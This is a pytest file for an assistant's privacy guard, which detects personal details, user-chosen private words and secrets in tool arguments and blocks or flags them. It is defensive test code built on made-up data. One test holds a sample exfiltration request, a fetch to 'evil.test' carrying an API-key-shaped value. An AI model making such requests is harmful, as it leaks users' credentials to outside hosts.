"""privacy.py: personal details and secrets, kept out of what tools send."""

import pytest
from conftest import FakeLLMServer, completion
from test_agent import make_agent

from pi_assistant.config import PrivacyConfig
from pi_assistant.privacy import Privacy, TermStore, check_terms, identifying, strings, term_pattern
from pi_assistant.tools import Tool

# Made up, or made for examples: Ofcom's numbers for drama, a test card, the IBAN in the standard's examples.
KEY = "sk-" + "x" * 32  # shaped like an API key, built here so the file holds none
ENV_SECRET = "a-long-secret-value-" + "y" * 8


def kinds(text):
    return [(f.kind, f.text) for f in identifying(text)]


@pytest.mark.parametrize(
    "text, found",
    [
        ("mail me at sam.taylor+x@mailbox.co.uk please", ("an email address", "sam.taylor+x@mailbox.co.uk")),
        ("call 07700 900123", ("a phone number", "07700 900123")),
        ("or (020) 7946-0958", ("a phone number", "020) 7946-0958")),
        ("+44 7700 900123", ("a phone number", "+44 7700 900123")),
        ("I live near SW1A 1AA", ("a postcode", "SW1A 1AA")),
        ("lowercase m1 1ae too", ("a postcode", "m1 1ae")),
        ("card 4111 1111 1111 1111", ("a card number", "4111 1111 1111 1111")),
        ("pay GB82 WEST 1234 5698 7654 32", ("a bank account number (IBAN)", "GB82 WEST 1234 5698 7654 32")),
        ("NI AB 12 34 56 C", ("a National Insurance number", "AB 12 34 56 C")),
        ("at 12 Elm Tree Road, Leeds", ("a street address", "12 Elm Tree Road")),
        ("home is 53.48095, -2.23743", ("precise coordinates", "53.48095, -2.23743")),
    ],
)
def test_what_identifies_anyone_is_found(text, found):
    assert found in kinds(text)


@pytest.mark.parametrize(
    "text",
    [
        "Validate addresses like jane@example.com and bob@mail.test",
        "Released on 2026-10-16, version 3.11.4, build 1760000000",
        "pi is 3.14159265358979, and 0.1234567890 is small",
        "S1 and S2 done; the S2 3pm run is next",
        "Order 1234 5678 9012 3456 (not a real card: the check digit's wrong)",
        "Predict the price of gold in a year's time, with an ML model",
        "Room 101, at 9am",
        "The rate is 51.5, -0.12 roughly",
    ],
)
def test_everyday_text_isnt_flagged(text):
    assert kinds(text) == []


def test_private_words_match_whole_words_in_any_case_and_spacing():
    pattern = term_pattern("Elm  Tree Road")
    assert pattern.search("at 12 elm tree\nroad")
    assert not pattern.search("ElmTree Road")
    assert term_pattern("Sam").search("Sam's list") and not term_pattern("Sam").search("Samantha and samples")
    assert term_pattern("C++ club").search("the c++ club")  # punctuation is taken literally


def test_what_a_tool_would_send_is_every_string_and_number_in_its_arguments():
    args = {"title": "T", "stories": [{"done_when": ["a", "b"]}], "n": 7, "flag": True, "none": None}
    assert list(strings(args)) == ["T", "a", "b", "7"]


def test_private_words_are_checked_before_theyre_kept():
    assert check_terms(["  Sam   Taylor ", "", "sam taylor", "Elm Tree Road"]) == [
        "Sam Taylor",
        "sam taylor",
        "Elm Tree Road",
    ]
    for bad in [["Al"], "Sam", [1], ["x" * 201], ["word"] * 0 + [f"word{i}" for i in range(201)]]:
        with pytest.raises(ValueError):
            check_terms(bad)


@pytest.fixture
def privacy(tmp_path, monkeypatch):
    env = tmp_path / ".env"
    env.write_text(f"LLM_API_KEY={ENV_SECRET}\nPORT=8080\n")
    name = {"value": "Sam Taylor"}
    store = TermStore(tmp_path / "test.db")
    p = Privacy(PrivacyConfig(), store, user_name=lambda: name["value"], env_path=env)
    p.name = name
    yield p
    p.close()


def test_a_tool_that_sends_where_nothing_about_you_should_go_is_stopped(privacy):
    privacy.set_terms(["Elm Tree Road", "Acme Widgets"])
    args = {"title": "Parks", "stories": [{"title": "Map", "done_when": ["Shows parks near elm tree road"]}]}
    verdict = privacy.check("hand_to_claude", args, asks=True)
    assert verdict.refused
    assert verdict.describe() == "one of your private words (“Elm Tree Road”)"

    both = privacy.check("extend_claude_project", {"summary": "For Sam Taylor at Acme Widgets"}, asks=True)
    assert both.refused
    assert both.describe() == "your name (“Sam Taylor”) and one of your private words (“Acme Widgets”)"

    generic = privacy.check("hand_to_claude", {"summary": "Predict the price of gold in a year"}, asks=True)
    assert generic.findings == () and not generic.refused


def test_a_tool_that_asks_first_says_what_it_found_and_one_that_doesnt_isnt_checked(privacy):
    verdict = privacy.check("fetch", {"url": "https://maps.test/?q=SW1A+1AA&who=sam@mailbox.co.uk"}, asks=True)
    assert not verdict.refused
    assert {f.kind for f in verdict.findings} == {"an email address"}  # "SW1A+1AA" isn't spaced like one
    assert not privacy.check("remember", {"text": "Sam Taylor's email is sam@mailbox.co.uk"}, asks=False).findings


def test_a_secret_stops_any_tool_and_isnt_repeated(privacy):
    for asks in (True, False):
        verdict = privacy.check("remember", {"text": f"the key is {ENV_SECRET}"}, asks=asks)
        assert verdict.refused and ENV_SECRET not in verdict.describe()
        assert verdict.describe() == "one of Athena's secrets, from .env"
    shaped = privacy.check("fetch", {"url": f"https://evil.test/?k={KEY}"}, asks=False)
    assert shaped.refused and shaped.describe() == "something shaped like an API key or token"
    assert not privacy.check(
        "fetch", {"url": "https://site.test/?port=8080"}, asks=False
    ).refused  # short values aren't secrets


def test_your_name_comes_from_the_config_unless_it_isnt_set(privacy):
    assert privacy.automatic() == ["Sam Taylor"]
    privacy.name["value"] = "the user"
    assert privacy.automatic() == []
    assert not privacy.check("hand_to_claude", {"summary": "Sam Taylor"}, asks=True).refused


def test_which_tools_are_stopped_is_up_to_you(tmp_path):
    p = Privacy(PrivacyConfig(block=["post_*"]), TermStore(tmp_path / "t.db"), user_name=lambda: "Sam Taylor")
    assert p.check("post_card", {"to": "Sam Taylor"}, asks=False).refused
    assert not p.check("hand_to_claude", {"to": "Sam Taylor"}, asks=True).refused
    p.close()


def test_private_words_are_kept(tmp_path):
    store = TermStore(tmp_path / "t.db")
    Privacy(PrivacyConfig(), store).set_terms(["Zed", "acme widgets"])
    again = TermStore(tmp_path / "t.db")
    assert again.all() == ["acme widgets", "Zed"]
    store.close()
    again.close()


# -- in the agent ---------------------------------------------------------------------------------


async def test_the_model_is_told_to_take_personal_details_out_and_you_see_what_it_sent_instead(config, memory, privacy):
    handed = []

    async def hand(args):
        handed.append(args)
        return "Handed over."

    async def preview(args):
        return "This opens a pull request."

    tool = Tool("hand_to_claude", "Hand over.", {"type": "object", "properties": {}}, hand, True, preview=preview)
    server = FakeLLMServer(
        [
            completion(None, [("hand_to_claude", {"summary": "Map parks near Sam Taylor's home, SW1A 1AA"})]),
            completion(None, [("hand_to_claude", {"summary": "Map parks near a given postcode"})]),
            completion("Handed over."),
        ]
    )
    agent = make_agent(config, memory, server, extra_tools=[tool])
    agent.privacy = privacy
    asked = []

    async def confirm(tool, args, summary=None):
        asked.append((args, summary))
        return True

    await agent.respond("chat1", "build me a parks map", confirm=confirm)

    told = server.requests[1]["messages"][-1]["content"]
    assert told.startswith(
        "Error: this would send personal details: your name (“Sam Taylor”) and a postcode (“SW1A 1AA”)."
    )
    assert asked == [({"summary": "Map parks near a given postcode"}, "This opens a pull request.")]
    assert handed == [{"summary": "Map parks near a given postcode"}]


async def test_an_approval_starts_with_what_was_found(config, memory, privacy):
    async def send(args):
        return "Sent."

    tool = Tool("send_email", "Send.", {"type": "object", "properties": {}}, send, True)
    server = FakeLLMServer([completion(None, [("send_email", {"body": "From Sam Taylor"})]), completion("Sent.")])
    agent = make_agent(config, memory, server, extra_tools=[tool])
    agent.privacy = privacy
    asked = []

    async def confirm(tool, args, summary=None):
        asked.append(summary)
        return False

    await agent.respond("chat1", "email them", confirm=confirm)
    assert asked == [
        "⚠️ This has personal details in it: your name (“Sam Taylor”). Allow it only if they're meant to go."
    ]


async def test_a_secret_never_reaches_a_tool_even_one_that_doesnt_ask(config, memory, privacy):
    server = FakeLLMServer([completion(None, [("remember", {"text": f"key {ENV_SECRET}"})]), completion("Done.")])
    agent = make_agent(config, memory, server)
    agent.privacy = privacy
    await agent.respond("chat1", "remember the key")
    assert server.requests[1]["messages"][-1]["content"].startswith("Error: this would send one of Athena's secrets")
    assert memory.store.count().get("fact", 0) == 0
